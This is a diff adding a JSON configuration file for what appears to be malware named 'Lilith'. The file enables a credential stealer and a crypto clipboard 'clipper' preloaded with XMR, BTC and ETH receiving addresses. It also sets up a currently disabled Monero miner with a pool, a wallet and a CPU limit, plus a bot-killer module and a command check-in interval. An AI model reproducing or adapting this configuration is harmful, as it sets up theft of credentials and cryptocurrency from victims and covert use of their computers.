@@ -1,0 +1,26 @@
+{
+    "Lilith": {
+        "CommandsCheckInterval": 14
+    },
+    "BotKiller": {
+        "Enabled": false
+    },
+    "Stealer": {
+        "Enabled": true
+    },
+    "Clipper": {
+        "Enabled": true,
+        "Addresses": {
+            "XMR": "493eic71yTX23KnxuC1FimhkW5kEv1G2aMcE1spdBYot5BLo2ZdDbUcPCLdXMQPgLpgkNxLH4FWDRLjcdxmvG6ba4D8saKg",
+            "BTC": "bc1qd8e4maz97mv23slmgg7d4je2mydslkl5m56vdz",
+            "ETH": "0xFf7f57a2c7952fD9550A5E0FE53d4F104886403A"
+        }
+    },
+    "Miner": {
+        "Enabled": false,
+        "Pool": "pool.minexmr.com:4444",
+        "Wallet": "493eic71yTX23KnxuC1FimhkW5kEv1G2aMcE1spdBYot5BLo2ZdDbUcPCLdXMQPgLpgkNxLH4FWDRLjcdxmvG6ba4D8saKg",
+        "Password": "x",
+        "MaxCPU": "40"
+    }
+}
